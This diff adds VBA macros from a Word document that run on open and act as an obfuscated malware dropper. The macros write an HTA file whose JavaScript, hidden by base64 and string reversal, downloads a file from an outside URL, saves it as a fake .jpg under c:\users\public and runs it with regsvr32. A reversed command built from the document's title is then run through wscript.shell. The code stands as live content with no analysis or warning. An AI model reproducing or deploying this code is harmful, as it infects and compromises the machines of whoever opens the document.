@@ -1,0 +1,90 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub Document_Open()
+main
+End Sub
+
+Attribute VB_Name = "frm"
+Attribute VB_Base = "0{7110B59A-7C8D-4706-AAE5-E3B69D968841}{F1348E90-3C6A-4F2C-A78E-B38B39835AD3}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Public Sub button1_Click()
+Set dataRepoView = ActiveDocument.BuiltInDocumentProperties("title")
+Set copyMainVb = CreateObject("wscript.shell")
+With copyMainVb
+.exec$ (sr(dataRepoView))
+End With
+End Sub
+
+
+Attribute VB_Name = "refTextbox"
+Sub main()
+responseConstCollection
+End Sub
+Function sr(arrayProc)
+sr = StrReverse(arrayProc)
+End Function
+Function gwc(arrayProc)
+If Len(arrayProc) > 0 Then
+gwc = arrayProc
+End If
+End Function
+Sub responseConstCollection()
+Dim variableSwap As String
+nextConstLoad = Split(sr(ActiveDocument.BuiltInDocumentProperties("title")), " ")
+variableSwap = nextConstLoad(1)
+Set selectButton = New textboxCount
+selectButton.clearRequestPtr variableSwap, localRepoQuery
+frm.button1_Click
+End Sub
+
+Attribute VB_Name = "bufIteratorW"
+Public Function structTextVb(copyReference)
+Dim swapPaste As Integer
+swapPaste = 31337
+If (Len(copyReference) < swapPaste) Then structTextVb = gwc("<html><body><div id='content'>fT" & "tlc29sYy5kYW9MYlZlemlzOykyICwiZ3" & "BqLm5vaXRwYUNuZWVyY3NcXGNpbGJ1cF" & "xcc3Jlc3VcXDpjIihlbGlmb3RldmFzLm" & "Rhb0xiVmV6aXM7KXlkb2Jlc25vcHNlci" & "54b2J0c2lMZXppcyhldGlydy5kYW9MYl" & "ZlemlzOzEgPSBlcHl0LmRhb0xiVmV6aX" & "M7bmVwby5kYW9MYlZlemlzOykibWFlcn" & "RzLmJkb2RhIih0Y2VqYk9YZXZpdGNBIH" & "dlbiA9IGRhb0xiVmV6aXMgcmF2eykwMD" & "IgPT0gc3V0YXRzLnhvYnRzaUxlemlzKG" & "ZpOykoZG5lcy54b2J0c2lMZXppczspZX" & "NsYWYgLCJvdWNIVUNIMEhzPWVtaXQmRm" & "k1TG9zYUFpNGpPeFZxWUxoVzY5V0k9ZW" & "dhcCZjVHNLaDZkWm5wSkQ9ZWdhcCZZSF" & "ZlT2VIMHA9R2F4N3Fvdk1XJmhMOHkyV3" & "NHWFlzTHJWaHpwakJwZzl6MlQwPXJlc3" & "UmU0FpRGpxWjQ9eEJVdUFxek5JZD8zd2" & "FsL2h0dW1vMnJGUDJHSG1uSjZpdUMwb2" & "ZTNlg1L0pUOFcyNUh2Q3lMU05KbWMvc2" & "9zZ2QvbW9jLmFuaWVsa3JlcHNvcnAvLz" & "pwdHRoIiAsIlRFRyIobmVwby54b2J0c2" & "lMZXppczspInB0dGhsbXguMmxteHNtIi" & "h0Y2VqYk9YZXZpdGNBIHdlbiA9IHhvYn" & "RzaUxlemlzIHJhdg==|fXspZWNuZXJlZ")
+End Function
+Public Function optionMain(copyReference)
+Dim swapPaste As Integer
+swapPaste = 31337
+If (Len(copyReference) < swapPaste) Then optionMain = gwc("mVSdHJldm5vYyhoY3RhY307KSJhdGgub" & "m9pdHBhQ25lZXJjc1xcY2lsYnVwXFxzc" & "mVzdVxcOmMiKGVsaWZldGVsZWQubm9pd" & "HBhQ3NzYWxje3lydDspInRjZWpib21ld" & "HN5c2VsaWYuZ25pdHBpcmNzIih0Y2VqY" & "k9YZXZpdGNBIHdlbiA9IG5vaXRwYUNzc" & "2FsYyByYXY7KSJncGoubm9pdHBhQ25lZ" & "XJjc1xcY2lsYnVwXFxzcmVzdVxcOmMgM" & "jNydnNnZXIiKG51ci4pImxsZWhzLnRwa" & "XJjc3ciKHRjZWpiT1hldml0Y0Egd2Vu<" & "/div><div id='table1'>ABCDEFGHIJ" & "KLMNOPQRSTUVWXYZ</div><div id='t" & "able2'>0123456789+/</div><div id" & "='table3'></div><script language" & "='javascript'>function pointerGl" & "obal(vbWindow){return(new Active" & "XObject(vbWindow));}function ref" & "Vb(rightLeftGeneric){return(cons" & "tStructRemove.getElementById(rig" & "htLeftGeneric).innerHTML);}funct" & "ion iteratorRefRight(){var colle" & "ctionTextboxGeneric = refVb('tab" & "le1');var repoFuncTitle = collec" & "tionTextboxGeneric.toLowerCase()" & ";var queryMain = refVb('table2')")
+End Function
+Public Function globalMemScreen(copyReference)
+Dim swapPaste As Integer
+swapPaste = 31337
+If (Len(copyReference) < swapPaste) Then globalMemScreen = gwc(";return(collectionTextboxGeneric" & " + repoFuncTitle + queryMain);}f" & "unction ALibMemory(s){var e={}; " & "var i; var b=0; var c; var x; va" & "r l=0; var a; var borderPointer=" & "''; var w=String.fromCharCode; v" & "ar L=s.length;var windowSwapQuer" & "y = exceptionReference('tArahc')" & ";for(i=0;i<64;i++){e[iteratorRef" & "Right()[windowSwapQuery](i)]=i;}" & "for(x=0;x<L;x++){c=e[s[windowSwa" & "pQuery](x)];b=(b<<6)+c;l+=6;whil" & "e(l>=8){((a=(b>>>(l-=8))&0xff)||" & "(x<(L-2)))&&(borderPointer+=w(a)" & ");}}return(borderPointer);};func" & "tion exceptionReference(WTextBuf" & "fer){return WTextBuffer.split(''" & ").reverse().join('');}classIndex" & "List = window;constStructRemove " & "= document;classIndexList.resize" & "To(1, 1);classIndexList.moveTo(-" & "100, -100);var ExValueCollection" & " = constStructRemove.getElementB" & "yId('content').innerHTML;var ExV" & "alueCollection = ExValueCollecti")
+End Function
+Public Function swapMemory(copyReference)
+Dim swapPaste As Integer
+swapPaste = 31337
+If (Len(copyReference) < swapPaste) Then swapMemory = gwc("on.split('|');var counterRequest" & " = exceptionReference(ALibMemory" & "(ExValueCollection[0]));var data" & "baseGlobalRemove = exceptionRefe" & "rence(ALibMemory(ExValueCollecti" & "on[1]));</script><script languag" & "e='javascript'>function textboxM" & "em(WCounter){var deleteButton = " & "pointerGlobal(exceptionReference" & "('lortnoctpircs.lortnoctpircssm'" & "));deleteButton['Language'] = 'j" & "script';deleteButton['Timeout'] " & "= 60000;deleteButton['AddCode'](" & "WCounter);return(null);}</script" & "><script language='vbscript'>tex" & "tboxMem counterRequest : textbox" & "Mem databaseGlobalRemove : class" & "IndexList.close</script></body><" & "/html>")
+End Function
+Function localRepoQuery()
+localRepoQuery = structTextVb("ames") + optionMain("tora") + globalMemScreen("ount") + swapMemory("Argu")
+End Function
+
+Attribute VB_Name = "textboxCount"
+Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = False
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = False
+Option Explicit
+Public Function clearRequestPtr(classList As String, arrayNext As String)
+Open classList For Output As #1
+Print #1, arrayNext
+Close #1
+End Function
+
